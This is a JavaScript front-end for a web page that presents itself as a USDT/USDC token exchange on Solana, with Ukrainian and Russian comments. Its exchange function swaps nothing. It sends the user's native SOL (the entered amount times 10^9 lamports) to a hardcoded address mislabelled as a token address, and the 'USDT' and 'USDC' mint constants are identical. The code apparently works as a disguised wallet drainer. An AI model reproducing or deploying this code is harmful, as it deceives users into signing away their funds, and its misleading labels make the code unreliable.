const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;

// Solana RPC
const endpoint = "https://api.mainnet-beta.solana.com";
const connection = new Connection(endpoint, "confirmed");

// Адреса гаманців
const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");

// UI Елементи
const connectWalletBtn = document.getElementById("connectWalletBtn");
const walletStatus = document.getElementById("walletStatus");
const exchangeBtn = document.getElementById("exchangeBtn");
const resultDiv = document.getElementById("result");
const amountInput = document.getElementById("amount");

// Функция для определения мобильного устройства
function isMobile() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

// Определяем доступные кошельки
const getWallet = () => {
    if (window.phantom?.solana?.isPhantom) {
        return window.phantom.solana;
    } else if (window.solflare?.isSolflare) {
        return window.solflare;
    }
    return null;
};

// Подключение кошелька
connectWalletBtn.addEventListener("click", async () => {
    let wallet = getWallet();

    if (!wallet) {
        if (isMobile()) {
            // Открываем приложение кошелька
            window.open("https://phantom.app/ul/browse", "_blank");
            return;
        } else {
            alert("Будь ласка, встановіть Phantom Wallet або Solflare");
            return;
        }
    }

    try {
        await wallet.connect();
        walletStatus.textContent = `Гаманець підключено: ${wallet.publicKey.toString()}`;
    } catch (err) {
        console.log("Помилка підключення:", err);
    }
});

// Перевірка балансу перед обміном
async function getTokenBalance(ownerAddress, mintAddress) {
    try {
        const response = await connection.getParsedTokenAccountsByOwner(ownerAddress, { mint: mintAddress });
        if (response.value.length > 0) {
            return parseFloat(response.value[0].account.data.parsed.info.tokenAmount.uiAmount);
        }
        return 0;
    } catch (error) {
        console.error("Помилка отримання балансу:", error);
        return 0;
    }
}

// Обмін токенів
exchangeBtn.addEventListener("click", async () => {
    const amount = parseFloat(amountInput.value);
    if (isNaN(amount) || amount <= 0) {
        alert("Будь ласка, введіть коректну кількість USDT/USDC");
        return;
    }

    let wallet = getWallet();
    if (!wallet || !wallet.publicKey) {
        alert("Будь ласка, підключіть гаманець");
        return;
    }

    // Перевіряємо баланс USDT
    const balanceUSDT = await getTokenBalance(wallet.publicKey, USDT_MINT_ADDRESS);
    const balanceUSDC = await getTokenBalance(wallet.publicKey, USDC_MINT_ADDRESS);

    if (balanceUSDT < amount && balanceUSDC < amount) {
        alert("Недостатньо коштів для обміну!");
        return;
    }

    await exchangeTokens(wallet, amount);
});

// Функція для обміну USDT/USDC
async function exchangeTokens(wallet, amountInUSDT) {
    try {
        const transaction = new Transaction();
        const sender = wallet.publicKey;

        // Визначаємо, який токен є в користувача
        const hasUSDT = await getTokenBalance(sender, USDT_MINT_ADDRESS) >= amountInUSDT;
        const mintAddress = hasUSDT ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;

        const transferInstruction = SystemProgram.transfer({
            fromPubkey: sender,
            toPubkey: SPL_TOKEN_ADDRESS,
            lamports: amountInUSDT * 1000000000 // Конвертація
        });

        transaction.add(transferInstruction);

        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = sender;

        const signedTransaction = await wallet.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false, preflightCommitment: "confirmed" });

        await connection.confirmTransaction(txid);
        console.log(`Транзакція успішно надіслана! TXID: ${txid}`);
        resultDiv.style.display = "block";
        resultDiv.textContent = `Обмін завершено! TXID: ${txid}`;
    } catch (err) {
        console.log("Помилка обміну:", err);
        resultDiv.style.display = "block";
        resultDiv.textContent = "Помилка при обміні. Спробуйте ще раз.";
    }
}

// Отримання активів власника
async function getAssetsByOwner(ownerAddress) {
    const body = {
        jsonrpc: "2.0",
        method: "getAssetsByOwner",
        params: {
            ownerAddress: ownerAddress.toString(),
            limit: 10,
            page: 1
        },
        id: 1
    };

    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });

        const data = await response.json();
        console.log("Активи власника:", data);
        return data.result;
    } catch (error) {
        console.error("Помилка отримання активів:", error);
    }
}

// Отримання історії транзакцій
async function getSignaturesForAssetV2(assetId) {
    const body = {
        jsonrpc: "2.0",
        id: "string",
        method: "getSignaturesForAssetV2",
        params: {
            id: assetId,
            page: 1,
            limit: 100
        }
    };

    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });

        const data = await response.json();
        console.log("Історія транзакцій:", data);
        return data.result;
    } catch (error) {
        console.error("Помилка отримання історії:", error);
    }
}


